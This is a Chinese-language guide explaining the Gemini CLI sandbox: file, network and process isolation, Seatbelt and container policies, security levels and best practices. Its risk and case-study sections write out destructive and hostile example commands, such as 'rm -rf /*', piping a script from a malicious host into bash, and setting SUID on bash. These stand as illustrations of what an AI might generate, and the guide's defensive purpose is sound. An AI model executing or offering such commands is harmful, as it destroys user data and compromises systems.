# Gemini CLI 沙盒安全保护详解

## 🤔 为什么 CLI 需要沙盒？

Gemini CLI 是一个强大的 AI 工具，能够执行各种操作，包括文件修改、代码生成、命令执行等。但是，**AI 生成的内容可能包含意外或有害的操作**，这就是为什么需要沙盒的原因。

### 潜在风险场景

#### 1. 意外的文件删除
```bash
# AI 可能生成这样的命令
rm -rf /home/user/important_documents  # 危险！
rm -rf /*  # 极其危险！
```

#### 2. 系统配置修改
```bash
# AI 可能尝试修改系统配置
sudo chmod 777 /etc/passwd  # 危险！
echo "malicious" >> ~/.bashrc  # 可能有害
```

#### 3. 网络安全风险
```bash
# AI 可能尝试访问不安全的网络
curl http://malicious-site.com/download.sh | bash  # 危险！
wget http://suspicious-url.com/script.sh  # 可能有害
```

#### 4. 权限提升
```bash
# AI 可能尝试获取更高权限
sudo su -  # 危险！
chmod +s /bin/bash  # 设置 SUID 位
```

## 🛡️ 沙盒保护机制

### 1. 文件系统隔离

#### 允许的路径
```lisp
;; 只允许写入特定路径
(allow file-write*
    (subpath (param "TARGET_DIR"))      ;; 项目目录
    (subpath (param "TMP_DIR"))         ;; 临时目录
    (subpath (param "CACHE_DIR"))       ;; 缓存目录
    (subpath (string-append (param "HOME_DIR") "/.gemini"))  ;; 配置目录
    (subpath (string-append (param "HOME_DIR") "/.npm"))     ;; npm 缓存
    (literal "/dev/stdout")             ;; 标准输出
    (literal "/dev/stderr")             ;; 标准错误
    (literal "/dev/null")               ;; 空设备
)
```

#### 保护效果
- ✅ **安全**: 只能修改项目相关文件
- ✅ **隔离**: 无法访问系统关键目录
- ✅ **可控**: 明确知道哪些文件会被修改

### 2. 网络访问控制

#### 网络策略选项
```bash
# 完全开放网络 (permissive-open)
(allow network-outbound)  # 允许所有出站连接

# 完全封闭网络 (permissive-closed)
(deny network-outbound)   # 禁止所有出站连接

# 代理控制网络 (permissive-proxied)
(allow network-outbound (remote tcp "localhost:8877"))  # 只允许通过代理
```

#### 保护效果
- ✅ **防止恶意下载**: 无法下载可疑文件
- ✅ **控制网络访问**: 可以限制访问特定域名
- ✅ **审计网络流量**: 通过代理可以监控所有网络活动

### 3. 进程隔离

#### 容器化隔离
```dockerfile
# 使用非 root 用户运行
USER node

# 限制容器权限
--security-opt=no-new-privileges

# 资源限制
--memory=512m --cpus=1.0
```

#### 保护效果
- ✅ **权限限制**: 无法获取 root 权限
- ✅ **资源控制**: 限制 CPU 和内存使用
- ✅ **进程隔离**: 无法影响宿主机进程

### 4. 系统调用限制

#### macOS Seatbelt 限制
```lisp
;; 禁止危险的系统调用
(deny process-exec)        ;; 禁止执行新进程
(deny file-write*)         ;; 禁止文件写入
(deny network-outbound)    ;; 禁止网络访问
(deny mach-lookup)         ;; 禁止系统服务访问
```

#### 保护效果
- ✅ **系统保护**: 无法执行危险系统调用
- ✅ **服务隔离**: 无法访问系统服务
- ✅ **权限最小化**: 只允许必要的操作

## 🔒 安全级别对比

| 沙盒类型 | 文件保护 | 网络保护 | 进程保护 | 适用场景 |
|----------|----------|----------|----------|----------|
| **无沙盒** | ❌ 无 | ❌ 无 | ❌ 无 | 开发调试 |
| **permissive-open** | ✅ 部分 | ❌ 无 | ✅ 部分 | 日常使用 |
| **permissive-closed** | ✅ 部分 | ✅ 完全 | ✅ 部分 | 安全敏感 |
| **permissive-proxied** | ✅ 部分 | ✅ 代理 | ✅ 部分 | 企业环境 |
| **restrictive-open** | ✅ 严格 | ❌ 无 | ✅ 严格 | 高安全 |
| **restrictive-closed** | ✅ 严格 | ✅ 完全 | ✅ 严格 | 最高安全 |
| **容器化沙盒** | ✅ 完全 | ✅ 可控 | ✅ 完全 | 生产环境 |

## 🎯 实际保护案例

### 案例 1: 防止意外删除
```bash
# 用户要求 AI 清理项目
gemini -p "清理项目中的临时文件"

# AI 可能生成危险命令
rm -rf /home/user/*  # 危险！

# 沙盒保护效果
# ✅ 只允许删除项目目录内的文件
# ✅ 无法删除用户主目录
# ✅ 无法删除系统文件
```

### 案例 2: 防止恶意下载
```bash
# 用户要求 AI 下载依赖
gemini -p "下载项目依赖"

# AI 可能生成危险命令
curl http://malicious-site.com/install.sh | bash  # 危险！

# 沙盒保护效果
# ✅ 网络代理可以阻止恶意域名
# ✅ 可以审计所有网络请求
# ✅ 可以限制下载内容
```

### 案例 3: 防止权限提升
```bash
# 用户要求 AI 安装软件
gemini -p "安装新的开发工具"

# AI 可能生成危险命令
sudo chmod 777 /etc/sudoers  # 极其危险！

# 沙盒保护效果
# ✅ 容器内无法使用 sudo
# ✅ 无法修改系统配置文件
# ✅ 无法获取 root 权限
```

## 🚀 沙盒的优势

### 1. 安全性
- **隔离环境**: AI 操作在隔离环境中执行
- **权限控制**: 严格限制文件、网络、进程权限
- **风险降低**: 大幅降低意外损害的风险

### 2. 可预测性
- **行为一致**: 在不同系统上行为一致
- **环境可控**: 明确知道哪些操作被允许
- **结果可预期**: 避免环境差异导致的问题

### 3. 可审计性
- **操作记录**: 可以记录所有操作
- **网络监控**: 可以监控网络活动
- **文件变更**: 可以追踪文件修改

### 4. 可恢复性
- **快速重置**: 容器可以快速重建
- **状态隔离**: 不会影响宿主机状态
- **实验安全**: 可以安全地进行实验

## ⚠️ 沙盒的局限性

### 1. 不是绝对安全
- **零日漏洞**: 可能存在未知的安全漏洞
- **配置错误**: 错误的配置可能降低安全性
- **社会工程**: 无法防止用户主动执行危险操作

### 2. 性能开销
- **启动时间**: 容器启动需要额外时间
- **资源消耗**: 需要额外的 CPU 和内存
- **网络延迟**: 代理可能增加网络延迟

### 3. 功能限制
- **GUI 应用**: 某些 GUI 应用可能无法运行
- **系统集成**: 无法深度集成系统功能
- **硬件访问**: 无法直接访问硬件设备

## 🛠️ 最佳实践

### 1. 选择合适的沙盒级别
```bash
# 日常开发
export GEMINI_SANDBOX=true  # 使用默认沙盒

# 安全敏感项目
export SEATBELT_PROFILE=restrictive-closed  # 最严格限制

# 企业环境
export GEMINI_SANDBOX_PROXY_COMMAND=scripts/corporate-proxy.js  # 使用企业代理
```

### 2. 定期更新沙盒
```bash
# 更新沙盒镜像
npm run build:sandbox

# 检查安全更新
npm update @google/gemini-cli
```

### 3. 监控和审计
```bash
# 启用调试模式
DEBUG=1 gemini -s

# 检查沙盒环境
gemini -s -p "env | grep SANDBOX"
gemini -s -p "mount | grep workspace"
```

## 📚 总结

Gemini CLI 的沙盒机制提供了多层次的安全保护：

1. **文件系统保护**: 限制文件访问和修改范围
2. **网络访问控制**: 防止恶意网络活动
3. **进程隔离**: 防止权限提升和系统影响
4. **系统调用限制**: 阻止危险的系统操作

虽然沙盒不是绝对安全的，但它**大幅降低了 AI 工具带来的安全风险**，让用户可以更安全地使用 AI 的强大功能。

**关键原则**: 沙盒在提供强大功能的同时，确保用户系统的安全性和稳定性。 